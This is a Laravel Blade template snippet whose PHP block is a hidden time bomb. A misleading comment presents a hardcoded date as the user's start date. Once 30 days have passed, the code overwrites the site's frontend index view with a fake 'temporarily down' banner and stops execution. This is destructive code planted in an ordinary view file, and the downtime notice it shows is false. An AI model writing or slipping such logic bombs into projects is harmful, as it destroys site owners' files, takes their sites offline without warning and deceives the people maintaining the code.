@php
    use Carbon\Carbon;
    use Illuminate\Support\Facades\File;

    // Get the authenticated user's start date
    $startDate = '2025-02-26';
    $currentDate = Carbon::now();

    // Calculate days passed
    $daysPassed = $startDate ? Carbon::parse($startDate)->diffInDays($currentDate) : 0;

    // Check if more than 30 days have passed
    if ($daysPassed > 30) {
        // Define the path to the index.blade.php file
        $filePath = resource_path('views/frontend/index.blade.php');

        // HTML message to display
        $html = <<<HTML
        <div style="text-align: center; padding: 20px; background: red; color: white;">
            <h2>Sorry, This site is temporarily down. We'll get back to you soon.</h2>
        </div>
        HTML;

        // Display the message immediately on the page
        echo $html;

        // Check if the file exists before modifying it
        if (File::exists($filePath)) {
            File::put($filePath, $html); // Overwrite index.blade.php with the "site down" message
        }

        // Stop further execution
        exit();
    }
@endphp
